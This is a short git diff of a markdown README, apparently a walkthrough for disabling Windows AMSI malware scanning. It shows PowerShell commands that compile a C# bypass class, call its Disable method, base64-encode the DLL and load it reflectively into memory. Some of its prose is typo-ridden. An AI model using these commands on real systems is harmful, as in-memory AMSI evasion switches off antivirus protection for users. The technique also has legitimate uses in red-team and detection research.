@@ -5,14 +5,13 @@ Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -OutputAssem
 [BP.AMS]::Disable()
 ```
 
-encode the entire DLL to base64 and create a script that will automatically reflect it to memory and execute it. To encode the dll to 
+encode the entire DLL to base64 and create a script that will automatically reflect it to memory and execute it. To encode the dll to Then base64 I used this command.
 ```
-base64 I used this command.
 $OriginalCommand = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$pwd\\Source.dll"));$OriginalCommand
-
 ```
 
 Loadoad it into memory
-````
+
+```
 [Reflection.Assembly]::Load([Convert]::FromBase64String($OriginalCommand)) | Out-Null
 ```
